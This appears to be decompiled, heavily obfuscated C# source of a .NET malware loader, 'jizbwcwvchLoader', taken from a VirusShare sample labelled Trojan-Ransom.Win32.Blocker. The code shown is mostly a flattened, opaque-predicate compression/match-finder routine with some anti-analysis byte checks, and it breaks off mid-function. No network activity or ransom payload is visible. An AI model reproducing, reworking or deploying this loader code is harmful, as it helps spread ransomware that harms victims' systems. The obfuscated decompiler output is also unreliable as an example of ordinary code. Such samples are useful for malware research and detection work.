// Decompiled with JetBrains decompiler
// Type: 
// Assembly: jizbwcwvchLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B60D9367-1A45-4565-96B0-53F2CD92A512
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.bdzb-39b748d8a4dd59a65e8a25c296dfc3aa1df8ddf8.exe

using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Threading;
using Ⴍ;

public sealed class \u0006 : \u0003, Ⴍ.Ⴀ, Ⴍ.Ⴅ
{
  private uint Ⴄ;
  private uint Ⴍ;
  private uint Ⴈ;
  private uint Ⴗ;
  private uint[] Ⴗ;
  private uint[] Ⴐ;
  private bool Ⴓ;
  private uint Ⴐ;
  private static bool Ⴃ;
  private \u0006.ႭႠ Ⴜ;

  public \u0006()
  {
    this.Ⴜ.Ⴈ = (uint) byte.MaxValue;
    base.Ⴍ = true;
    this.Ⴜ.Ⴓ = 1024U;
    this.Ⴐ = 4U;
    base.Ⴜ = 1048576U;
    // ISSUE: explicit constructor call
    base.\u002Ector();
    Ⴍ.ႷႣ.ႷႷ();
  }

  public void \u0002(int _param1, bool _param2)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num = 2;
    while (true)
    {
      switch (num)
      {
        case 0:
          this.Ⴓ = _param2;
          if (base.Ⴍ)
          {
            num = (int) ⴍ[7];
            continue;
          }
          goto label_10;
        case 1:
          this.Ⴜ.Ⴓ = 1024U;
          this.Ⴜ.Ⴄ = 0U;
          goto case 3;
        case 3:
          num = 4;
          continue;
        case 4:
          goto label_7;
        case 5:
          goto label_8;
        default:
          base.Ⴍ = _param1 > 2;
          goto case 0;
      }
    }
label_7:
    this.Ⴐ = 4U;
label_8:
    base.Ⴜ = this.Ⴓ ? 8388608U : 1048576U;
    return;
label_10:
    this.Ⴜ.Ⴄ = 2U;
label_11:
    this.Ⴐ = 2U;
    switch ((int) ⴗ[82] * 3)
    {
      case 0:
        goto label_10;
      case 2:
        goto label_11;
      case 3:
        base.Ⴜ = 65536U;
        break;
      case 4:
        break;
      default:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.\u0002);
        break;
    }
  }

  private uint Ⴜ([In] uint obj0, out uint _param2, out uint _param3)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    uint num1 = ႷႤ.Ⴍ[(int) this.\u0002[(IntPtr) obj0]] ^ (uint) this.\u0002[(IntPtr) (obj0 + 1U)];
label_4:
    int num2 = (int) ⴍ[154] - 74;
    while (true)
    {
      switch (num2)
      {
        case 0:
          num2 = (int) ⴍ[272];
          continue;
        case 1:
        case 5:
          num1 ^= (uint) this.\u0002[(IntPtr) (obj0 + 2U)] << 8;
          goto case 0;
        case 2:
          goto label_4;
        case 3:
          _param2 = num1 & this.Ⴜ.Ⴓ - 1U;
          num2 = 1;
          continue;
        case 6:
          goto label_3;
        case 7:
          goto label_8;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴜ);
          num2 = 6;
          continue;
      }
    }
label_8:
    _param3 = num1 & 262143U;
    return (uint) (((int) num1 ^ (int) ႷႤ.Ⴍ[(int) this.\u0002[(IntPtr) (obj0 + 3U)]] << 5) & (int) base.Ⴜ - 1);
  }

  private uint \u0002([In] uint obj0)
  {
    int num1 = (int) this.\u0002[(IntPtr) obj0];
    int num2 = (int) this.\u0002[(IntPtr) (obj0 + 1U)] << 8;
    Ⴍ.Ⴜ.Ⴗ[115] = \u0003\u2002.Ⴍ[214];
    return (uint) (num1 ^ num2);
  }

  public new void \u0005\u2009\u2001\u0002(Stream _param1)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num = 12;
    uint index;
    while (true)
    {
      switch (num)
      {
        case 0:
          index = 0U;
          num = 2;
          continue;
        case 1:
          this.Ⴅ[(IntPtr) index] = 0U;
          ++index;
          num = (int) ⴍ[516] - 200;
          continue;
        case 2:
          num = index < this.Ⴜ.Ⴓ ? (int) ⴍ[425] - 184 : 5;
          continue;
        case 3:
          goto label_13;
        case 5:
          index = 0U;
          num = 10;
          continue;
        case 6:
          ++index;
          num = (int) ⴗ[109] - 150;
          continue;
        case 7:
          this.Ⴐ[(IntPtr) index] = 0U;
          goto case 6;
        case 8:
        case 10:
          num = index < 262144U ? (int) ⴗ[48] / 8 : 3;
          continue;
        case 9:
          num = !base.Ⴍ ? 3 : 0;
          continue;
        case 11:
          num = index < base.Ⴜ ? 7 : (int) ⴗ[48] + 1;
          continue;
        case 13:
          base.Ⴍ[(IntPtr) index] = 0U;
          ++index;
          num = 2;
          continue;
        default:
          base.\u0005\u2009\u2001\u0002(_param1);
          index = 0U;
          num = (int) ⴍ[369];
          continue;
      }
    }
label_13:
    this.Ⴄ = 0U;
    this.\u0002(-1);
  }

  public new void \u0005\u2009\u2001\u0002() => base.\u0005\u2009\u2001\u0002();

  public new void \u0005\u2009\u2001\u0003()
  {
    int num = 5;
    while (true)
    {
      switch (num)
      {
        case 1:
          goto label_6;
        case 2:
          this.Ⴄ = 0U;
          num = 6;
          continue;
        case 4:
          goto label_7;
        case 6:
          base.\u0005\u2009\u2001\u0003();
          goto case 7;
        case 7:
          num = this.\u0002\u2000 != (uint) int.MaxValue ? 4 : 1;
          continue;
        default:
          ++this.Ⴄ;
          num = this.Ⴄ < this.Ⴍ ? 6 : 2;
          continue;
      }
    }
label_7:
    return;
label_6:
    this.ႭႥ();
  }

  public new byte \u0005\u2009\u2001\u0002(int _param1)
  {
    int num = (int) base.\u0005\u2009\u2001\u0002(_param1);
    \u0003\u2002.Ⴍ[421] = (byte) ((int) \u0003\u2002.Ⴍ[421] & _param1 & 186);
    return (byte) num;
  }

  public new uint \u0005\u2009\u2001\u0002(int _param1, uint _param2, uint _param3) => base.\u0005\u2009\u2001\u0002(_param1, _param2, _param3);

  public new uint \u0005\u2009\u2001\u0002() => base.\u0005\u2009\u2001\u0002();

  public void \u0008\u2009\u2001\u0002(uint _param1, uint _param2, uint _param3, uint _param4)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num1 = 6;
    uint num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 7:
          base.Ⴍ = new uint[(IntPtr) this.Ⴜ.Ⴓ];
          this.Ⴅ = new uint[new IntPtr(262144)];
          num1 = (int) ⴗ[82];
          continue;
        case 1:
          goto label_12;
        case 2:
          this.\u0002(_param1 + _param2, _param3 + _param4, num2);
          num1 = this.\u000F + 256U <= (uint) int.MaxValue ? 5 : (int) ⴍ[369];
          continue;
        case 3:
          this.Ⴗ = new uint[(IntPtr) (this.Ⴍ * 2U)];
          goto case 9;
        case 4:
          num1 = 10;
          continue;
        case 5:
          this.Ⴈ = _param1;
          this.Ⴗ = _param3;
          this.Ⴍ = _param1 + 1U;
          num1 = 3;
          continue;
        case 8:
          this.Ⴗ = (uint[]) null;
          this.Ⴐ = (uint[]) null;
          base.Ⴍ = (uint[]) null;
          this.Ⴅ = (uint[]) null;
          num1 = 2;
          continue;
        case 9:
          this.Ⴐ = new uint[(IntPtr) base.Ⴜ];
          goto case 4;
        case 10:
          num1 = !base.Ⴍ ? (int) ⴗ[82] : 0;
          continue;
        case 11:
          goto label_5;
        default:
          num2 = (_param1 + _param2 + _param3 + _param4) / 2U + 256U;
          num1 = 8;
          continue;
      }
    }
label_12:
    return;
label_5:
    throw new Exception();
  }

  public uint \u0008\u2009\u2001\u0002(uint[] _param1)
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int num1 = this.\u0002\u2000 + this.Ⴗ > this.\u0006\u2000 ? (int) ⴗ[114] - 177 : 35;
    uint num2;
    uint index1;
    while (true)
    {
      uint num3;
      uint num4;
      uint index2;
      uint index3;
      uint index4;
      uint index5;
      uint num5;
      uint num6;
      uint num7;
      uint num8;
      uint num9;
      bool flag1;
      bool flag2;
      uint index6;
      uint index7;
      uint num10;
      uint num11;
      uint ⴈ;
      uint num12;
      uint num13;
      uint num14;
      uint index8;
      int num15;
      int num16;
      switch (num1)
      {
        case 0:
          ⴈ = this.Ⴜ.Ⴈ;
          num1 = (int) ⴍ[401] - 97;
          continue;
        case 1:
          num1 = num5 < num4 ? 18 : (int) ⴍ[35];
          continue;
        case 2:
          num5 = this.Ⴗ[(IntPtr) index7];
          num1 = num13 <= num11 ? (int) ⴗ[82] : 70;
          continue;
        case 3:
          num1 = num13 <= num10 ? (int) ⴗ[82] : 74;
          continue;
        case 4:
          num1 = !base.Ⴍ ? 76 : (int) ⴗ[49] - 200;
          continue;
        case 5:
          _param1[2] = num8;
          _param1[3] = num9;
          num1 = 25;
          continue;
        case 6:
          num1 = num14 <= this.Ⴄ ? 9 : 10;
          continue;
        case 7:
          _param1[2] = num8;
          index1 = 2U;
          num1 = 56;
          continue;
        case 8:
          _param1[3] = num9;
          num1 = 54;
          continue;
        case 9:
          num15 = (int) this.Ⴄ - (int) num14;
          goto label_46;
        case 10:
          num15 = (int) this.Ⴄ - (int) num14 + (int) this.Ⴍ;
          goto label_46;
        case 11:
          num1 = index1 >= 3U ? 63 : 55;
          continue;
        case 12:
          index5 = this.Ⴜ(index2, out index3, out index4);
          num1 = 43;
          continue;
        case 13:
          _param1[(IntPtr) ++index1] = num14 - 1U;
          num1 = (int) ⴍ[300] - (int) ⴍ[198];
          continue;
        case 14:
          this.Ⴐ[(IntPtr) index5] = this.\u0002\u2000;
          num1 = num5 >= num4 ? 32 : 33;
          continue;
        case 15:
          goto label_6;
        case 16:
          flag2 = true;
          num1 = 47;
          continue;
        case 17:
        case 75:
          index4 = 0U;
          num1 = !base.Ⴍ ? (int) ⴗ[113] : 12;
          continue;
        case 18:
          this.Ⴗ[(IntPtr) index6] = 0U;
          this.Ⴗ[(IntPtr) index7] = 0U;
          num1 = 4;
          continue;
        case 19:
          num16 = (int) this.\u0002\u2000 - (int) this.Ⴈ;
          break;
        case 21:
          num9 = (uint) ((int) this.\u0002\u2000 - (int) num7 - 1);
          num2 = 3U;
          goto case 16;
        case 22:
          num1 = (int) this.\u0002[(IntPtr) (this.\u000E + num6)] != (int) this.\u0002[(IntPtr) index2] ? (int) ⴗ[29] - 160 : (int) ⴍ[312] - 167;
          continue;
        case 23:
        case 80:
          this.Ⴅ[(IntPtr) index4] = this.\u0002\u2000;
          num1 = num7 < num4 ? (int) ⴗ[92] - 102 : (int) ⴍ[366];
          continue;
        case 24:
          num1 = !base.Ⴍ ? (int) ⴗ[148] - 53 : 5;
          continue;
        case 25:
          goto label_32;
        case 26:
          this.Ⴗ[(IntPtr) index6] = num5;
          index6 = index8;
          num5 = this.Ⴗ[(IntPtr) index6];
          num1 = 3;
          continue;
        case 27:
          this.Ⴗ[(IntPtr) index6] = num5;
          index6 = index8;
          num5 = this.Ⴗ[(IntPtr) index6];
          num1 = (int) ⴍ[562] - 54;
          continue;
        case 28:
          num1 = num8 >= _param1[2] ? (int) ⴍ[13] : 61;
          continue;
        case 29:
          num16 = 1;
          break;
        case 30:
          this.Ⴗ[(IntPtr) index7] = this.Ⴗ[(IntPtr) index8];
          num1 = (int) ⴍ[51];
          continue;
        case 31:
          num1 = !base.Ⴍ ? 54 : 36;
          continue;
        case 32:
          index6 = (uint) (((int) this.Ⴄ << 1) + 1);
          index7 = this.Ⴄ << 1;
          num1 = (int) ⴍ[68] - 201;
          continue;
        case 33:
          this.Ⴗ[(IntPtr) (this.Ⴄ << 1)] = 0U;
          this.Ⴗ[(IntPtr) (uint) (((int) this.Ⴄ << 1) + 1)] = 0U;
          num1 = 24;
          continue;
        case 34:
          num1 = !flag2 ? (int) ⴗ[134] / 4 : 66;
          continue;
        case 35:
          num3 = this.Ⴗ;
          num1 = (int) ⴍ[164];
          continue;
        case 36:
          num1 = !flag1 ? 34 : 65;
          continue;
        case 37:
          _param1[2] = num8;
          num1 = 34;
          continue;
        case 38:
          int ⴄ;
          num10 = (uint) (ⴄ = (int) this.Ⴜ.Ⴄ);
          num11 = (uint) ⴄ;
          index1 = (uint) ⴄ;
          _param1[(IntPtr) index1] = (uint) ((int) this.\u0002\u2000 - (int) num5 - 1);
          num1 = 0;
          continue;
        case 39:
          num1 = num13 > index1 ? (int) ⴍ[191] / 4 : (int) ⴍ[98] - 136;
          continue;
        case 40:
          num1 = num13 <= num10 ? 1 : 53;
          continue;
        case 41:
          num1 = (int) this.\u0002[(IntPtr) (num12 + num13)] >= (int) this.\u0002[(IntPtr) (index2 + num13)] ? (int) ⴗ[94] - 224 : (int) ⴍ[211];
          continue;
        case 42:
          num6 = base.Ⴍ[(IntPtr) index3];
          num7 = this.Ⴅ[(IntPtr) index4];
          num1 = 62;
          continue;
        case 43:
          num5 = this.Ⴐ[(IntPtr) index5];
          num6 = 0U;
          num7 = 0U;
          num1 = 60;
          continue;
        case 44:
          num8 = num9;
          num1 = (int) ⴗ[152] - 146;
          continue;
        case 45:
          num1 = index1 >= 2U ? (int) ⴍ[197] : 7;
          continue;
        case 46:
          num8 = (uint) ((int) this.\u0002\u2000 - (int) num6 - 1);
          num2 = 2U;
          flag1 = true;
          num1 = (int) ⴍ[407] - 133;
          continue;
        case 47:
          num1 = !flag1 ? 78 : 50;
          continue;
        case 48:
          this.Ⴗ[(IntPtr) index6] = this.Ⴗ[(IntPtr) (index8 + 1U)];
          num1 = 30;
          continue;
        case 49:
          num1 = num13 < num3 ? 57 : 71;
          continue;
        case 50:
          num1 = num9 >= num8 ? 14 : (int) ⴍ[569] / 4;
          continue;
        case 51:
          num1 = !flag1 ? (int) ⴗ[79] - 131 : 45;
          continue;
        case 52:
          num3 = this.\u0006\u2000 - this.\u0002\u2000;
          num1 = num3 >= this.Ⴐ ? 73 : 15;
          continue;
        case 53:
          num10 = num13;
          num1 = 1;
          continue;
        case 54:
          goto label_67;
        case 55:
          _param1[3] = num9;
          index1 = 3U;
          num1 = 76;
          continue;
        case 56:
          num1 = !flag2 ? 76 : (int) ⴍ[369];
          continue;
        case 57:
          num1 = (int) this.\u0002[(IntPtr) (num12 + num13)] != (int) this.\u0002[(IntPtr) (index2 + num13)] ? 71 : 67;
          continue;
        case 58:
          _param1[3] = num9;
          num1 = 76;
          continue;
        case 59:
          goto label_3;
        case 60:
          num8 = 0U;
          num9 = 0U;
          flag1 = false;
          flag2 = false;
          num1 = !base.Ⴍ ? (int) ⴗ[135] - 116 : 42;
          continue;
        case 61:
          _param1[2] = num8;
          num1 = 56;
          continue;
        case 62:
          base.Ⴍ[(IntPtr) index3] = this.\u0002\u2000;
          num1 = num6 < num4 ? (int) ⴗ[70] - 179 : 22;
          continue;
        case 63:
          num1 = num9 >= _param1[3] ? (int) ⴍ[147] + (int) ⴍ[9] : 58;
          continue;
        case 64:
          --ⴈ;
          num1 = (int) ⴗ[33];
          continue;
        case 65:
          num1 = num8 >= _param1[2] ? 34 : 37;
          continue;
        case 66:
          num1 = num9 >= _param1[3] ? (int) ⴍ[214] : (int) ⴍ[13] / 7;
          continue;
        case 67:
          ++num13;
          num1 = (int) ⴗ[166] - 91;
          continue;
        case 68:
          num1 = ⴈ > 0U ? (int) ⴗ[159] - 1 : (int) ⴗ[77] - 108;
          continue;
        case 69:
          num1 = num13 >= this.Ⴗ ? 48 : 27;
          continue;
        case 70:
          num11 = num13;
          num1 = (int) ⴍ[7];
          continue;
        case 71:
          num14 = this.\u0002\u2000 - num5;
          num1 = (int) ⴍ[181] / 5;
          continue;
        case 72:
          index5 = this.\u0002(index2);
          num1 = 43;
          continue;
        case 73:
          num1 = this.\u0002\u2000 > this.Ⴈ ? (int) ⴗ[11] - 91 : 29;
          continue;
        case 74:
          num10 = num13;
          num1 = 1;
          continue;
        case 76:
          goto label_83;
        case 77:
          num12 = this.\u000E + num5;
          num13 = ႷႰ.ႭႥ(num11, num10, 'Ǩ', (short) 390);
          num1 = (int) ⴍ[511] - (int) ⴍ[507];
          continue;
        case 78:
          num8 = num9;
          flag1 = true;
          num1 = (int) ⴍ[103] - 161;
          continue;
        case 79:
          num1 = (int) this.\u0002[(IntPtr) (this.\u000E + num7)] != (int) this.\u0002[(IntPtr) index2] ? (int) ⴍ[96] - 135 : 21;
          continue;
        case 81:
          this.Ⴗ[(IntPtr) index7] = num5;
          index7 = index8 + 1U;
          num1 = 2;
          continue;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.\u0008\u2009\u2001\u0002);
          num1 = 59;
          continue;
      }
      num4 = (uint) num16;
      index2 = this.\u000E + this.\u0002\u2000;
      num2 = 0U;
      index3 = 0U;
      num1 = 75;
      continue;
label_46:
      index8 = (uint) (num15 << 1);
      num1 = (int) num13 == (int) num3 ? 69 : (int) ⴗ[135] - 89;
    }
label_6:
    return 0;
label_32:
    return num2;
label_67:
    return index1;
label_83:
    return index1;
  }

  public void \u0008\u2009\u2001\u0002()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
    int num1 = 5;
    uint num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
          goto label_10;
        case 1:
        case 4:
          goto label_3;
        case 2:
          if (num2 < this.Ⴐ)
          {
            num1 = 6;
            continue;
          }
          goto label_10;
        case 3:
          num2 = this.\u0006\u2000 - this.\u0002\u2000;
          goto case 2;
        case 6:
          goto label_4;
        default:
          num1 = this.\u0002\u2000 + this.Ⴗ > this.\u0006\u2000 ? 3 : (int) ⴗ[82];
          continue;
      }
    }
label_4:
    return;
label_3:
    num2 = this.Ⴗ;
label_10:
    int num3 = this.\u0002\u2000 > this.Ⴈ ? 22 : 33;
    uint index1;
    uint index2;
    uint index3;
    while (true)
    {
      uint num4;
      uint num5;
      uint index4;
      uint index5;
      uint index6;
      uint num6;
      uint num7;
      uint num8;
      uint ⴈ;
      uint num9;
      uint num10;
      uint num11;
      int num12;
      int num13;
      switch (num3)
      {
        case 0:
          num7 = num10;
          num3 = (int) ⴍ[46] / 3;
          continue;
        case 1:
          num11 = this.\u0002\u2000 - num6;
          goto case 7;
        case 2:
          num7 = num10;
          num3 = 38;
          continue;
        case 3:
          goto label_10;
        case 4:
          num9 = this.\u000E + num6;
          num10 = ႷႰ.ႭႥ(num8, num7, 'Ό', (short) 994);
          num3 = (int) ⴍ[118];
          continue;
        case 5:
          num3 = ⴈ > 0U ? 4 : (int) ⴗ[109] - 137;
          continue;
        case 6:
          num8 = num7 = this.Ⴜ.Ⴄ;
          ⴈ = this.Ⴜ.Ⴈ;
          num3 = 5;
          continue;
        case 7:
          num3 = num11 <= this.Ⴄ ? (int) ⴗ[37] - 102 : (int) ⴍ[59] - 41;
          continue;
        case 8:
          num6 = this.Ⴐ[(IntPtr) index6];
          num3 = !base.Ⴍ ? (int) ⴗ[80] - (int) ⴗ[147] : 21;
          continue;
        case 9:
          goto label_21;
        case 10:
          base.Ⴍ[(IntPtr) index4] = this.\u0002\u2000;
          this.Ⴅ[(IntPtr) index5] = this.\u0002\u2000;
          num3 = (int) ⴗ[55] - 219;
          continue;
        case 11:
          this.Ⴐ[(IntPtr) index6] = this.\u0002\u2000;
          num3 = num6 >= num4 ? 16 : 9;
          continue;
        case 12:
          num3 = (int) this.\u0002[(IntPtr) (num9 + num10)] >= (int) this.\u0002[(IntPtr) (num5 + num10)] ? (int) ⴗ[168] - (int) ⴗ[24] : 28;
          continue;
        case 13:
          index6 = this.Ⴜ(num5, out index4, out index5);
          num3 = (int) ⴗ[48];
          continue;
        case 14:
          num3 = num10 <= num7 ? (int) ⴍ[232] - 176 : 2;
          continue;
        case 15:
          num3 = (int) this.\u0002[(IntPtr) (num9 + num10)] != (int) this.\u0002[(IntPtr) (num5 + num10)] ? 1 : 23;
          continue;
        case 16:
          index1 = (uint) (((int) this.Ⴄ << 1) + 1);
          index2 = this.Ⴄ << 1;
          num3 = (int) ⴍ[214] / 9;
          continue;
        case 17:
          --ⴈ;
          num3 = 5;
          continue;
        case 18:
        case 37:
          num3 = num10 >= this.Ⴗ ? 30 : (int) ⴍ[173] - 187;
          continue;
        case 19:
          this.Ⴗ[(IntPtr) index1] = num6;
          index1 = index3;
          num6 = this.Ⴗ[(IntPtr) index1];
          goto case 34;
        case 20:
          num12 = (int) this.Ⴄ - (int) num11;
          goto label_32;
        case 21:
          int num14 = (int) base.Ⴍ[(IntPtr) index4];
          int num15 = (int) this.Ⴅ[(IntPtr) index5];
          num3 = (int) ⴍ[332] - 16;
          continue;
        case 22:
          num13 = (int) this.\u0002\u2000 - (int) this.Ⴈ;
          break;
        case 23:
          ++num10;
          num3 = 27;
          continue;
        case 24:
          goto label_50;
        case 25:
          goto label_46;
        case 26:
          num8 = num10;
          num3 = (int) ⴗ[50] - 182;
          continue;
        case 27:
          num3 = num10 < num2 ? 15 : (int) ⴍ[7];
          continue;
        case 28:
          this.Ⴗ[(IntPtr) index2] = num6;
          index2 = index3 + 1U;
          num3 = 32;
          continue;
        case 29:
          index6 = this.\u0002(num5);
          num3 = 8;
          continue;
        case 30:
          this.Ⴗ[(IntPtr) index1] = this.Ⴗ[(IntPtr) (index3 + 1U)];
          num3 = 25;
          continue;
        case 31:
          num12 = (int) this.Ⴄ - (int) num11 + (int) this.Ⴍ;
          goto label_32;
        case 32:
          num6 = this.Ⴗ[(IntPtr) index2];
          num3 = num10 <= num8 ? 38 : 26;
          continue;
        case 33:
          num13 = 1;
          break;
        case 34:
          num3 = 39;
          continue;
        case 35:
          num3 = !base.Ⴍ ? 29 : 13;
          continue;
        case 36:
          this.Ⴗ[(IntPtr) index1] = num6;
          index1 = index3;
          num6 = this.Ⴗ[(IntPtr) index1];
          num3 = (int) ⴍ[23] - 199;
          continue;
        case 38:
          num3 = num6 < num4 ? 24 : 17;
          continue;
        case 39:
          num3 = num10 <= num7 ? 38 : 0;
          continue;
        default:
          goto label_9;
      }
      num4 = (uint) num13;
      num5 = this.\u000E + this.\u0002\u2000;
      index4 = 0U;
      index5 = 0U;
      num3 = 35;
      continue;
label_32:
      index3 = (uint) (num12 << 1);
      num3 = (int) num10 == (int) num2 ? 37 : 12;
    }
label_9:
    // ISSUE: method reference
    RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.\u0008\u2009\u2001\u0002);
    return;
label_21:
    this.Ⴗ[(IntPtr) (this.Ⴄ << 1)] = 0U;
    this.Ⴗ[(IntPtr) (uint) (((int) this.Ⴄ << 1) + 1)] = 0U;
    return;
label_46:
    this.Ⴗ[(IntPtr) index2] = this.Ⴗ[(IntPtr) index3];
    return;
label_50:
    this.Ⴗ[(IntPtr) index1] = 0U;
    this.Ⴗ[(IntPtr) index2] = 0U;
  }

  private void ႭႨ([In] uint[] obj0, [In] uint obj1, [In] uint obj2)
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num1 = 5;
    uint index;
    uint num2;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 4:
        case 7:
        case 9:
          num2 = obj0[(IntPtr) index];
          num1 = num2 > obj2 ? 3 : 2;
          continue;
        case 1:
          goto label_8;
        case 2:
          num2 = 0U;
          num1 = 8;
          continue;
        case 3:
          num2 -= obj2;
          num1 = 8;
          continue;
        case 6:
          num1 = index < obj1 ? 0 : 1;
          continue;
        case 8:
          obj0[(IntPtr) index] = num2;
          ++index;
          num1 = 6;
          continue;
        default:
          index = 0U;
          num1 = (int) ⴍ[578] - 181;
          continue;
      }
    }
label_8:;
  }

  private void ႭႥ()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num1 = 4;
    uint num2;
    uint num3;
    while (true)
    {
      switch (num1)
      {
        case 0:
        case 7:
          this.ႭႨ(this.Ⴗ, this.Ⴍ * 2U, num3);
          this.ႭႨ(this.Ⴐ, base.Ⴜ, num3);
          num1 = (int) ⴍ[243] - 72;
          continue;
        case 1:
          num3 = num2 - 1U;
          num1 = (int) ⴍ[272];
          continue;
        case 2:
        case 6:
          goto label_7;
        case 3:
          num1 = !base.Ⴍ ? 2 : 5;
          continue;
        case 5:
          goto label_6;
        default:
          num2 = this.\u0002\u2000 - this.Ⴈ;
          goto case 1;
      }
    }
label_6:
    this.ႭႨ(base.Ⴍ, this.Ⴜ.Ⴓ, num3);
    this.ႭႨ(this.Ⴅ, 262144U, num3);
label_7:
    this.\u0002((int) num3);
  }

  public void \u0002(uint _param1) => this.Ⴜ.Ⴈ = _param1;

  static \u0006() => \u0006.Ⴀ();

  internal static long Ⴐ()
  {
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    \u0006.ႭႭ(297, 'Ň').SetData(\u000E.Ⴓ(2088295578, 5, 15L, (byte) 2), (object) null);
label_4:
    int num = (int) ⴗ[70] - 199;
    while (true)
    {
      switch (num)
      {
        case 0:
        case 2:
          goto label_4;
        case 1:
        case 3:
          goto label_5;
        case 5:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴐ);
          num = 5;
          continue;
      }
    }
label_5:
    return 10;
  }

  internal static void Ⴅ()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    int num1 = 0;
    int num2;
    while (true)
    {
      switch (num1)
      {
        case 1:
          goto label_4;
        case 2:
          goto label_5;
        case 3:
          goto label_6;
        case 4:
        case 5:
          num1 = num2 % 2 != 0 ? (int) ⴍ[123] : 1;
          continue;
        case 6:
          goto label_7;
        default:
          int num3 = 647;
          int num4 = num3;
          int num5 = num4 * num4;
          num2 = num3 + num5;
          num1 = 4;
          continue;
      }
    }
label_5:
    return;
label_6:
    return;
label_7:
    return;
label_4:
    \u0006.Ⴅ();
  }

  internal static byte Ⴄ()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
label_3:
    int index = 0;
label_4:
    Array array = (Array) \u0003.Ⴐ(\u0006.ႭႭ(953, 'ϖ'), \u000E.Ⴓ(2088295579, 4, 3L, (byte) 14), 892, (short) 855);
    int num1 = (int) ⴍ[112];
    while (true)
    {
      switch (num1)
      {
        case 0:
          goto label_11;
        case 1:
        case 9:
          num1 = (byte) 8 == (array as byte[])[index] ? 3 : (int) ⴍ[272];
          continue;
        case 2:
          num1 = (byte) 208 == ((byte[]) array)[index] ? 10 : (int) ⴍ[326] - 77;
          continue;
        case 3:
          ++index;
          goto case 11;
        case 4:
          num1 = ((byte[]) array)[index] < (byte) 208 ? 0 : 2;
          continue;
        case 5:
          goto label_4;
        case 6:
          goto label_5;
        case 7:
          \u0006.Ⴐ();
          num1 = (int) ⴍ[389] - 31;
          continue;
        case 10:
          goto label_15;
        case 11:
          num1 = 4;
          continue;
        case 12:
          num1 = ((byte[]) array)[index] < (byte) 8 ? 6 : 1;
          continue;
        case 13:
          ႷႰ.Ⴐ();
          num1 = 10;
          continue;
        case 14:
          goto label_3;
        default:
          // ISSUE: method reference
          RuntimeMethodHandle runtimeMethodHandle = __methodref (\u0006.Ⴄ);
          num1 = (int) ⴍ[549] - (int) ⴍ[388];
          continue;
      }
    }
label_5:
    return 20;
label_11:
    return 10;
label_15:
    int num2 = index + 1;
    return 22;
  }

  internal static long Ⴈ()
  {
    byte[] ⴍ = \u0003\u2002.Ⴍ;
    byte[] ⴗ = Ⴍ.Ⴜ.Ⴗ;
label_3:
    int index = 0;
    object obj = (object) (byte[]) \u0003.Ⴐ(\u0006.ႭႭ(605, 'ȭ'), \u000E.Ⴓ(2088295582, 1, 11L, (byte) 27), 96, (short) 76);
label_4:
    int num1 = (int) ⴍ[422] - 204;
    while (true)
    {
      switch (num1)
      {
        case 0:
          \u0006.Ⴐ();
          num1 = 14;
          continue;
        case 1:
          num1 = (obj as byte[])[index] < (byte) 29 ? 7 : 5;
          continue;
        case 2:
          num1 = (byte) 218 == (obj as byte[])[index] ? 28 : 29;
          continue;
        case 3:
          num1 = (byte) 208 == (obj as byte[])[index] ? 14 : 0;
          continue;
        case 4:
          num1 = (byte) 8 == ((byte[]) obj)[index] ? (int) ⴍ[60] - 163 : (int) ⴗ[39] - 86;
          continue;
        case 5:
          num1 = (byte) 29 == ((byte[]) obj)[index] ? 24 : (int) ⴗ[72] + 15;
          continue;
        case 6:
          goto label_4;
        case 7:
        case 13:
          goto label_15;
        case 8:
          ++index;
          num1 = (int) ⴍ[109] - (int) ⴍ[567];
          continue;
        case 9:
          goto label_20;
        case 10:
          num1 = ((byte[]) obj)[index] < (byte) 8 ? 11 : (int) ⴗ[112] - 149;
          continue;
        case 11:
          goto label_5;
        case 12:
          ႷႳ.Ⴄ();
          num1 = 8;
          continue;
        case 14:
          ++index;
          num1 = (int) ⴍ[388] - 46;
          continue;
        case 15:
        case 17:
          goto label_10;
        case 16:
          goto label_3;
        case 19:
          num1 = ((byte[]) obj)[index] < (byte) 208 ? 17 : (int) ⴗ[71] - 63;
          continue;
        case 20:
          num1 = (byte) 248 == (obj as byte[])[index] ? (int) ⴍ[423] : (int) ⴍ[107];
          continue;
        case 21:
          \u000E.Ⴄ();
          num1 = (int) ⴗ[170] - 179;
          continue;
        case 22:
          Ⴍ.ႷႣ.Ⴀ();
          num1 = 24;
          continue;
        case 23:
          goto label_25;
        case 24:
          ++index;
          num1 = 26;
          continue;
        case 25:
          ++index;
          num1 = (int) ⴍ[458] - 111;
          continue;
        case 26:
          num1 = (obj as byte[])[index] < (byte) 248 ? 9 : (int) ⴗ[35];
          continue;
        case 27:
